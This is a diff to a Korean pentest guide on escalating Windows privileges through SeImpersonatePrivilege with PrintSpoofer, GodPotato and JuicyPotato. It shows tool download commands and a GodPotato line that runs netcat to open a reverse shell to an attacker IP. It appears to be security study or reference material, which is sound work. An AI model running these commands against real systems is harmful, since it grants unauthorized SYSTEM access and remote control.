@@ -1,4 +1,15 @@
-cu
+---
+layout: page
+title: SeImpersonatePrivilege
+description: >
+  This chapter covers the basics of content creation with Hydejack.
+hide_description: true
+sitemap: false
+---
+
+0. this unordered seed list will be replaced by toc as unordered list
+{:toc}
+
 
 # SeImpersonate / SeAssignPrimaryToken 권한 상승 가이드
 
@@ -14,7 +25,7 @@ cu
 
 - **목표:** 현재 사용자가 해당 권한을 보유하고 있는지 확인합니다.
 
-```powershell title="현재 세션의 권한 확인"
+```powershell
 whoami /priv
 ```
 
@@ -30,7 +41,7 @@ whoami /priv
 - **특징:** 최신 Windows 버전(Windows 10, Server 2019/2022)에서도 안정적으로 작동하는 가장 현대적이고 효과적인 도구입니다.
 - **[GitHub 링크](https://github.com/itm4n/PrintSpoofer)**
 
-```powershell title="PrintSpoofer - 대화형 SYSTEM 셸 획득"
+```powershell
 wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
 # -i: 대화형 모드로 실행
 # -c: 실행할 명령어
@@ -44,7 +55,7 @@ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64
 - **특징:** PrintSpoofer와 마찬가지로 최신 Windows 환경을 지원하는 또 다른 강력한 도구입니다.
 - **[GitHub 링크](https://github.com/BeichenDream/GodPotato)**
 
-```powershell title="GodPotato - 리버스 셸 실행"
+```powershell
 # -cmd: 실행할 명령어 (예: nc.exe를 이용한 리버스 셸 연결)
 ./GodPotato-NET4.exe -cmd "C:\Windows\tasks\nc.exe <attacker_ip> 4444 -e cmd.exe"
 
@@ -60,7 +71,7 @@ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64
 - Useful reference video of attack : https://youtu.be/dXotJLV6jj4?t=1848
 - Run systeminfo on box and then find the proper CLSID from here : https://github.com/ohpe/juicy-potato/tree/master/CLSID/
 
-```powershell title="JuicyPotato - 특정 CLSID로 공격"
+```powershell
 # -t *: 프로세스 생성 방식 (t: create process, u: with token, p: with program)
 # -l: 리스닝 포트
 # -p: 실행할 프로그램
